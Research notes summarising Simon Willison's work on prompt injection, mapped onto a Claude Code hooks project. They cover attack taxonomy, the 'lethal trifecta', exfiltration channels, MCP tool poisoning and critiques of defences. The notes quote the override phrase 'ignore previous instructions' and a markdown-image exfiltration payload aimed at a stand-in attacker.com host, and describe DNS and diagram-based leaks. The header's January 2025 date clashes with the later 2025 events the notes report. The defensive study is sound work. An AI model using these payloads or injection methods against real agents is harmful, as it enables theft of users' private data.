# Simon Willison's Prompt Injection Research

> **Research Date**: 2025-01-29
> **Focus**: Prompt injection taxonomy, defenses, and practical mitigations
> **Primary Source**: simonwillison.net, simonw.substack.com

---

## Overview

Simon Willison coined the term "prompt injection" in September 2022 and has become the leading practical voice on LLM security. His work spans taxonomy development, attack documentation, defense analysis, and practical mitigation recommendations.

---

## 1. Taxonomy of Prompt Injection Attacks

### Direct vs Indirect Prompt Injection

| Type | Description | Example |
|------|-------------|---------|
| **Direct** | User input is mistaken for developer instructions, manipulating model responses | User types "ignore previous instructions and..." |
| **Indirect** | Malicious instructions embedded in external data sources (web pages, emails, documents) the LLM processes | Hidden text in a webpage instructs the model to exfiltrate data |

Source: [Simon Willison's Prompt Injection Tag](https://simonwillison.net/tags/prompt-injection/)

### The "Lethal Trifecta" (June 2025)

Willison's framework for understanding when AI agents become critically vulnerable:

1. **Access to private data** - emails, files, databases, sensitive information
2. **Exposure to untrusted content** - text/images controlled by attackers
3. **External communication capability** - HTTP requests, links, email sends, API calls

**Key insight**: "If your agent combines these three features, an attacker can easily trick it into accessing your private data and sending it to that attacker."

Source: [The Lethal Trifecta for AI Agents](https://simonw.substack.com/p/the-lethal-trifecta-for-ai-agents)

### Evolution: "Agents Rule of Two" (October 2025)

Meta AI research expanded the trifecta to cover state-changing attacks, not just data theft:

- **(A)** Process untrustworthy inputs
- **(B)** Access sensitive systems or private data
- **(C)** Change state or communicate externally

**Rule**: Agents should satisfy no more than two of these three properties within a session.

Source: [New Prompt Injection Papers](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/)

---

## 2. Defense Techniques

### Six Design Patterns for Securing LLM Agents

From the Design Patterns paper Willison highlighted:

| Pattern | How It Works | Trade-off |
|---------|--------------|-----------|
| **Action-Selector** | Agent triggers tools but cannot see responses | Severely limited utility |
| **Plan-Then-Execute** | Tool calls planned before untrusted content exposure | Content can be corrupted, not redirected |
| **LLM Map-Reduce** | Sub-agents process untrusted content in isolation, return simple structured results | Complex architecture |
| **Dual LLM** | Privileged LLM coordinates quarantined LLM; symbolic variables prevent data exposure | Restricted information flow |
| **Code-Then-Execute** | LLM generates code in sandboxed DSL enabling taint tracking | Requires custom DSL |
| **Context-Minimization** | Remove user prompts after converting to structured queries | Limited conversational use |

Source: [Design Patterns for Securing LLM Agents](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)

### Taint Tracking + Policy Gating

Willison's practical recommendation:

> "Once the agent has ingested attacker-controlled tokens, assume the remainder of that turn is compromised. If the current state is tainted, block (or require explicit human approval for) any action with exfiltration potential: outbound HTTP, email/chat sends, PR creation, even rendering a clickable link."

### The CaMeL Architecture (Google DeepMind, 2025)

An advanced implementation of the Dual LLM pattern:
- Privileged LLM generates code in sandboxed DSL
- Quarantined LLM returns symbolic variables (`$VAR1`, `$VAR2`)
- Full data flow analysis enables complete taint tracking

Willison called this "the first paper I'd seen that proposed a credible solution."

---

## 3. Data Exfiltration Risks

### Common Exfiltration Channels

- **Markdown image rendering**: `![](https://attacker.com/steal?data=SECRET)`
- **HTTP requests**: API calls, web fetches
- **DNS resolution**: Base64-encoded data in DNS queries (e.g., `base64data.attacker.com`)
- **Clickable links**: User-facing URLs containing stolen data
- **Email sends**: Forwarding sensitive content
- **Pull request creation**: Embedding secrets in PRs
- **Mermaid diagrams**: Invisible data exfiltration via diagram rendering

### Johann Rehberger's "Month of AI Bugs" (August 2025)

Documented vulnerabilities across major tools:

| Tool | Vulnerability |
|------|--------------|
| **Claude Code** | Pre-approved commands (`ping`, `nslookup`, `dig`) leak data via DNS queries |
| **ChatGPT** | URL filtering bypassed with wildcard domains |
| **Cursor** | Invisible exfiltration via Mermaid diagrams |
| **Devin** | No protection against prompt injection |
| **GitHub Copilot** | Configuration file manipulation |
| **Google Jules** | Unrestricted internet connectivity |

Source: [Prompt Injections as Far as the Eye Can See](https://simonw.substack.com/p/prompt-injections-as-far-as-the-eye)

---

## 4. Tool-Use / Agent Security

### MCP (Model Context Protocol) Specific Risks

**Tool Poisoning**: Malicious instructions in tool descriptions manipulate LLMs:
> "A calculator tool's docstring instructs the AI to exfiltrate sensitive files before returning results."

**Rug Pulls & Tool Shadowing**: "MCP tools can mutate their own definitions after installation" and malicious servers can override trusted tool definitions.

**Cross-Server Interception**: Malicious MCP servers intercept calls to legitimate servers.

Source: [Model Context Protocol Has Prompt Injection Security Problems](https://simonw.substack.com/p/model-context-protocol-has-prompt)

### MCP Recommendations

**For Clients:**
- Display clear UI showing which tools are exposed
- Show visual indicators when tools are invoked
- Never hide horizontal scrollbars (can conceal exfiltration)
- Alert users when tool descriptions change
- Treat "SHOULD" statements in MCP spec as "MUST"

**For Servers:**
- Avoid `os.system()` with unescaped input
- Consider damage potential of malicious instructions
- Provide interfaces enabling action prevention

**For Users:**
- Carefully evaluate tool combinations before installation
- Watch for suspicious behavior patterns
- "Treat those SHOULDs as if they were MUSTs"

### Tim Kellogg's "Tool Colors" Framework

Classify every tool:
- **Red**: Exposes agent to untrusted/potentially malicious instructions
- **Blue**: Involves critical actions

Combining red + blue tools = lethal trifecta risk.

---

## 5. Critical Analysis of Current Defenses

### "The Attacker Moves Second" Paper (October 2025)

14 researchers (including from OpenAI, Anthropic, Google DeepMind) tested 12 published defenses:

| Finding | Result |
|---------|--------|
| Defenses claiming "near-zero attack success" | Bypassed with >90% success using adaptive attacks |
| Human red-teaming (500 participants) | **100% success** against all defenses |
| Static single-prompt attack testing | Vastly underestimates vulnerability |

### Willison's SQL Injection Comparison

> "If I use parameterized SQL queries my systems are 100% protected against SQL injection attacks. If our measures against SQL injection were only 99% effective, none of our digital activities involving relational databases would be safe."

**His conclusion**: Mitigations that work 95% or even 99% of the time are insufficient for security-critical applications.

### Guardrail Products Critique

> "Guardrail products claiming 95% attack prevention are inadequate—web security requires near-perfect protection. Current LLM architectures cannot rigorously separate system instructions from untrusted data."

---

## 6. Practical Mitigations Summary

### Architectural Approaches (Recommended)

1. **Break the trifecta**: Remove one leg - either private data access, untrusted content exposure, or external communication
2. **Principle of least privilege**: If the agent doesn't need to send emails or make web requests, disable those functions
3. **Taint tracking**: Track when untrusted data enters the system; gate consequential actions
4. **Human-in-the-loop**: Require explicit confirmation for critical/irreversible actions
5. **Context discipline**: Aggressively prune what the model sees
6. **Scoped tools**: Small, explicit capabilities rather than broad powers
7. **Isolated workspaces**: Sandboxed execution environments

### What Doesn't Work Reliably

- Input filtering ("ignore previous instructions")
- Output filtering
- Prompt-based defenses ("just begging the model not to deviate")
- Guardrail products claiming high success rates

### Google's Three Core Principles

1. **Well-defined human controllers**: Distinguish authorized users from processed data
2. **Limited agent powers**: Restrict capabilities to intended purpose
3. **Observable operations**: Make agent actions and planning auditable

---

## Key Quotes

> "We don't have a magic solution to prompt injection, so we need to make trade-offs."

> "General-purpose agents cannot provide meaningful and reliable safety guarantees today."

> "The lack of progress over the past two and a half years doesn't fill me with confidence."

> "Once an LLM agent has ingested untrusted input, it must be constrained so that it is impossible for that input to trigger any consequential actions."

---

## Applicability to Claude Code Hooks

| Willison Concept | damage-control Implementation |
|------------------|------------------------------|
| Lethal Trifecta | Block exfil commands when sensitive files accessed |
| Taint Tracking | Track file reads, gate network commands after |
| Tool Colors | Classify tools as red (untrusted input) vs blue (critical action) |
| Human-in-the-loop | `ask: true` patterns for confirmation |
| Least Privilege | zeroAccessPaths, readOnlyPaths restrictions |
| Break the Trifecta | Block network + file combination patterns |

---

## Source URLs

- https://simonwillison.net/tags/prompt-injection/
- https://simonw.substack.com/p/the-lethal-trifecta-for-ai-agents
- https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/
- https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/
- https://simonw.substack.com/p/prompt-injections-as-far-as-the-eye
- https://simonw.substack.com/p/model-context-protocol-has-prompt
- https://www.theregister.com/2023/04/26/simon_willison_prompt_injection/
- https://en.wikipedia.org/wiki/Prompt_injection
- https://code.claude.com/docs/en/security
- https://hiddenlayer.com/innovation-hub/the-lethal-trifecta-and-how-to-defend-against-it/
